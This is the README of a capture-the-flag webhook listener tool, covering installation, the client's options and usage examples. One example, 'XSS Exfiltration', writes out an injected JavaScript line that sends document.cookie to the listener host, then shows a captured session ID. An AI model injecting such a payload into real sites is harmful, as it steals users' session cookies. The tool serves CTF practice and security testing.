# CTF Webhook Listener

TODO

## Installing

### The Client with Pip

Requires at least Python 3.8.

```
$ pip install 'git+https://github.com/Prillan/ctf-hook#subdirectory=ctf-hook-client'
```
or clone and run
```
$ pip3.8 install --user ./ctf-hook-client
```

### The Client with Nix

Install by running
```
$ nix-env -f default.nix -i ctf-hook-client
installing 'ctf-hook-client-0.1.0'
building '/nix/store/yr0w1szrmzgw66sm93frzi5zmgsvqa1b-user-environment.drv'...
created 680 symlinks in user environment
$ ctf-hook --help
usage: ctf-hook [-h] [--verbose] [--quiet] [--reuse-subdomain] [--config-file CONFIG_FILE] [--serve PATH]
                [--serve-file FILE] [--json] [--path] [--strip] [--urldecode] [--base64]

optional arguments:
  -h, --help            show this help message and exit

General options:
  --verbose, -v         Show debug information.
  --quiet, -q           Silence log output.
  --reuse-subdomain, -rs
                        Reuse the last used subdomain.
  --config-file CONFIG_FILE
                        Load config from CONFIG_FILE.

Serving files/directories:
  --serve PATH          Serves the whole directory structure if PATH is a directory, rooted at / on the server. Sets
                        the default server response if PATH is a file.
  --serve-file FILE, -sf FILE
                        Serves FILE at /FILE on the server. (Can be repeated multiple times)

Outputting:
  --json, -j            Output each request interpreted as a json payload.
  --path, -p            Only output the path of each request.
  --strip               Strips output of irrelevant parts. Currently only removes leading / from --path output.
  --urldecode           Url decode/unquote data before outputting it. Works with --path. Applies after --strip.
  --base64, -b64        Base64 decode data before outputting it. Works with --path. Applies after --urldecode.
```

### The Server with Nix

Build the server with
```
$ nix-build -A server
...
/nix/store/0cbk2ng2bcwlygpf4hfwhiykwipgs2x4-ctf-hook-0.1.0.0
$ ls result/bin
ctf-hook-server
```

## The Client

```
$ ctf-hook --help
usage: ctf-hook [-h] [--verbose] [--quiet] [--reuse-subdomain] [--config-file CONFIG_FILE] [--serve PATH]
                [--serve-file FILE] [--json] [--path] [--strip] [--urldecode] [--base64]

optional arguments:
  -h, --help            show this help message and exit

General options:
  --verbose, -v         Show debug information.
  --quiet, -q           Silence log output.
  --reuse-subdomain, -rs
                        Reuse the last used subdomain.
  --config-file CONFIG_FILE
                        Load config from CONFIG_FILE.

Serving files/directories:
  --serve PATH          Serves the whole directory structure if PATH is a directory, rooted at / on the server. Sets
                        the default server response if PATH is a file.
  --serve-file FILE, -sf FILE
                        Serves FILE at /FILE on the server. (Can be repeated multiple times)

Outputting:
  --json, -j            Output each request interpreted as a json payload.
  --path, -p            Only output the path of each request.
  --strip               Strips output of irrelevant parts. Currently only removes leading / from --path output.
  --urldecode           Url decode/unquote data before outputting it. Works with --path. Applies after --strip.
  --base64, -b64        Base64 decode data before outputting it. Works with --path. Applies after --urldecode.
```

### Examples

#### XSS Exfiltration

Say we have the following JS snippet.
```
tag.innerHTML = "<img src=\" + url + "\" />"
```

Let's grab the cookies.

```
tag.innerHTML = "<img src=\"" + server + "/" + escape(document.cookie) + "\" />"
```

Set up our client:
```
$ ctf-hook --path --urldecode
[2021-04-14 22:03:37,505]: INFO - Using domain 54bwvatlje.127.0.0.1.nip.io
[2021-04-14 22:03:37,505]: INFO -    Try a query: curl 54bwvatlje.127.0.0.1.nip.io/flag-xxyy
```

Trigger the XSS (simulated by using curl here)
```
$ curl '54bwvatlje.127.0.0.1.nip.io/admin%3D1%3B%20sessionId%3Ddeadbeef%3B'
data stored for subdomain 54bwvatlje!
```

Back to our client output:
```
/admin=1; sessionId=deadbeef;
```

Success!

#### Serving Images

```
$ ctf-hook --serve pwn.jpg
[2018-12-31 21:07:14,582]: INFO - Using subdomain 54bwvatlje.127.0.0.1.nip.io
[2018-12-31 21:07:14,599]: INFO - pwn.jpg uploaded to *
```

```
$ curl -s 54bwvatlje.127.0.0.1.nip.io:8080 | xxd | head -n 1
00000000: ffd8 ffe0 0010 4a46 4946 0001 0101 012c  ......JFIF.....,
```

or

```
$ ctf-hook --serve-file pwn.jpg
[2018-12-31 21:07:55,338]: INFO - Using subdomain 54bwvatlje.127.0.0.1.nip.io
[2018-12-31 21:07:55,369]: INFO - pwn.jpg uploaded to pwn.jpg
```

```
$ curl -s 54bwvatlje.127.0.0.1.nip.io:8080/pwn.jpg | xxd | head -n 1
00000000: ffd8 ffe0 0010 4a46 4946 0001 0101 012c  ......JFIF.....,
```
